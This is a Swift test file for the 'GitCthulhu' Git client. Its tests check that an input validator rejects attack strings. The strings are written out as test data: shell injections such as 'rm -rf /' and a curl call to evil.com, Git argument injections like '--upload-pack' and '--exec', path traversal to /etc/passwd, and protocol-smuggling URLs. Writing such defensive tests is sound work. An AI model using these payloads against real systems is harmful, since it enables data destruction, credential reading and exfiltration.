//
// GitInputValidatorAdvancedTests.swift
// GitCthulhu
//
// Created by GitCthulhu Team on 2025-07-12.
//

import Foundation
@testable import GitCore
import Testing

struct GitInputValidatorAdvancedTests {
    // MARK: - Advanced Edge Cases

    @Test("Complex SQL injection patterns")
    func complexSQLInjectionPatterns() async throws {
        let sqlPatterns = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; EXEC xp_cmdshell('rm -rf /'); --",
            "' UNION SELECT password FROM users WHERE '1'='1"
        ]

        for pattern in sqlPatterns {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateArguments([pattern])
            }
        }
    }

    @Test("Nested shell command injection")
    func nestedShellCommandInjection() async throws {
        let shellPatterns = [
            "$(rm -rf /)",
            "`curl evil.com/steal`",
            "${IFS}cat${IFS}/etc/passwd",
            "$(echo 'malicious' > /dev/null && rm -rf /)"
        ]

        for pattern in shellPatterns {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateArguments([pattern])
            }
        }
    }

    @Test("Unicode and encoding attacks")
    func unicodeAndEncodingAttacks() async throws {
        let unicodeAttacks = [
            "../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f",
            "\u{0000}",
            "\u{001b}[31mEvil\u{001b}[0m",
            "＜script＞alert('xss')＜/script＞"
        ]

        for attack in unicodeAttacks {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateRemoteURL(attack)
            }
        }
    }

    @Test("Protocol smuggling attempts")
    func protocolSmugglingAttempts() async throws {
        let smugglingAttempts = [
            "https://example.com#@evil.com/",
            "git://user:pass@evil.com/repo.git",
            "ssh://git@github.com:evil.com/repo.git",
            "file:///etc/passwd",
            "ftp://anonymous@evil.com/upload/"
        ]

        for attempt in smugglingAttempts {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateRemoteURL(attempt)
            }
        }
    }

    @Test("Performance with large inputs")
    func performanceWithLargeInputs() async throws {
        let largeInput = String(repeating: "a", count: 10000)

        #expect(throws: GitError.self) {
            try GitInputValidator.sanitizeCommitMessage(largeInput)
        }
    }

    @Test("Concurrent validation stress test")
    func concurrentValidationStressTest() async throws {
        let testInputs = [
            "normal-input",
            "malicious; rm -rf /",
            "$(dangerous)",
            "valid-branch-name",
            "../../../etc/passwd"
        ]

        await withTaskGroup(of: Void.self) { group in
            for _ in 0 ..< 50 {
                group.addTask {
                    for input in testInputs {
                        do {
                            try GitInputValidator.validateArguments([input])
                        } catch {
                            // Expected for malicious inputs
                        }
                    }
                }
            }
        }

        #expect(true)
    }

    // MARK: - Real-world Attack Vectors

    @Test("Real Git command injections")
    func realGitCommandInjections() async throws {
        let realAttacks = [
            "--upload-pack=evil.sh",
            "--exec=rm -rf /",
            "--receive-pack=/bin/sh",
            "-c core.autocrlf=false -c core.editor='touch /tmp/pwned'"
        ]

        for attack in realAttacks {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateArguments([attack])
            }
        }
    }

    @Test("Path traversal variations")
    func pathTraversalVariations() async throws {
        let traversalPatterns = [
            "../../../etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\",
            ".././.././.././etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
            "/var/www/../../etc/passwd"
        ]

        for pattern in traversalPatterns {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateRepositoryPath(pattern)
            }
        }
    }

    @Test("Network protocol abuse")
    func networkProtocolAbuse() async throws {
        let protocolAbuse = [
            "file:///proc/self/environ",
            "ftp://evil.com/upload/secrets.txt",
            "ldap://evil.com/cn=admin",
            "gopher://evil.com:70/1",
            "dict://evil.com:2628/show:banner"
        ]

        for `protocol` in protocolAbuse {
            #expect(throws: GitError.self) {
                try GitInputValidator.validateRemoteURL(`protocol`)
            }
        }
    }
}
